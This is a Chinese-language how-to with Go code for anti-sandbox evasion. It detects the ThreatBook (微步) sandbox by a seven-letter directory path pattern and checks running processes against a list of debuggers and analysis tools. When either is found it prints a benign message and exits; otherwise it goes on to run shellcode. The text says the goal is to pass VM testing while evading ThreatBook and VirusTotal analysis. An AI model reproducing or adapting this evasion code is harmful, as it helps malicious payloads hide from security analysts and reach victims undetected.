# 抗沙箱检测技术（轻量级）

## 说明

**轻量级方案：只检测真实分析沙箱，不检测虚拟机硬件**

这样你可以在VMware/VirtualBox中正常测试，程序只会在被微步/VirusTotal等沙箱分析时退出。

---

## Go实现

```go
package main

import (
    "golang.org/x/sys/windows"
    "regexp"
    "syscall"
    "unsafe"
)

// 轻量级沙箱检测（不影响虚拟机测试）
func lightSandboxCheck() bool {
    // 只检测真实沙箱特征，不检测VMware/VirtualBox
    
    // 1. 检测微步沙箱路径
    if detectWeibuPath() {
        return true
    }
    
    // 2. 检测分析进程
    if detectAnalysisProcess() {
        return true
    }
    
    // 不检测虚拟机硬件（VMware/VirtualBox）- 允许正常测试
    return false
}

// 检测微步沙箱路径: C:\[7位随机]\xxx.exe
func detectWeibuPath() bool {
    var path [windows.MAX_PATH + 1]uint16
    windows.GetModuleFileName(nil, &path[0], windows.MAX_PATH + 1)
    
    currentPath := windows.UTF16ToString(path[:])
    
    // 微步特征：C:\7位随机字母\程序名.exe
    pattern := regexp.MustCompile(`^[A-Za-z]:\\[A-Za-z]{7}\\[^\\]+\.exe$`)
    return pattern.MatchString(currentPath)
}

// 检测分析工具进程
func detectAnalysisProcess() bool {
    // 只检测真正的分析工具，不检测VMware/VirtualBox
    badProcesses := []string{
        "ollydbg.exe",
        "x64dbg.exe",
        "ida.exe",
        "ida64.exe",
        "windbg.exe",
        "pestudio.exe",
        "procmon.exe",
        "procexp.exe",
        "sysinternals",  // Sysinternals工具
    }
    
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    Process32First := kernel32.NewProc("Process32FirstW")
    Process32Next := kernel32.NewProc("Process32NextW")
    
    snapshot, _, _ := CreateToolhelp32Snapshot.Call(2, 0)
    if snapshot == 0 {
        return false
    }
    defer windows.CloseHandle(windows.Handle(snapshot))
    
    var entry PROCESSENTRY32W
    entry.Size = uint32(unsafe.Sizeof(entry))
    
    Process32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
    
    for {
        name := windows.UTF16ToString(entry.ExeFile[:])
        for _, bad := range badProcesses {
            if regexp.MustCompile(bad).MatchString(name) {
                return true
            }
        }
        
        ret, _, _ := Process32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
        if ret == 0 {
            break
        }
    }
    
    return false
}

type PROCESSENTRY32W struct {
    Size              uint32
    ProcessID         uint32
    DefaultHeapID     uintptr
    ModuleID          uint32
    Threads           uint32
    ParentProcessID   uint32
    PriorityClassBase uint32
    Flags             uint32
    ExeFile           [windows.MAX_PATH]uint16
}

// 使用示例
func main() {
    // 启动时检测一次
    if lightSandboxCheck() {
        // 在沙箱中，执行无害操作退出
        println("Application initialized successfully.")
        return
    }
    
    // 正常执行shellcode...
}
```

---

## 检测范围

| 检测项 | 是否检测 | 说明 |
|--------|----------|------|
| 微步沙箱路径 | ✓ | C:\[7位字母]\xxx.exe |
| 分析工具进程 | ✓ | IDA、x64dbg、OllyDbg等 |
| VMware硬件 | ✗ | 不检测，允许测试 |
| VirtualBox硬件 | ✗ | 不检测，允许测试 |
| CPU核心数 | ✗ | 不检测 |
| 内存大小 | ✗ | 不检测 |

---

## 一行调用版

```go
// 最简版本，直接调用
func check() bool {
    // 只检测微步路径
    var p [260]uint16
    windows.GetModuleFileName(nil, &p[0], 260)
    s := windows.UTF16ToString(p[:])
    return regexp.MustCompile(`^[A-Za-z]:\\[A-Za-z]{7}\\`).MatchString(s)
}
```

这样你在虚拟机测试完全不受影响，只有上传到微步沙箱时才会触发检测退出。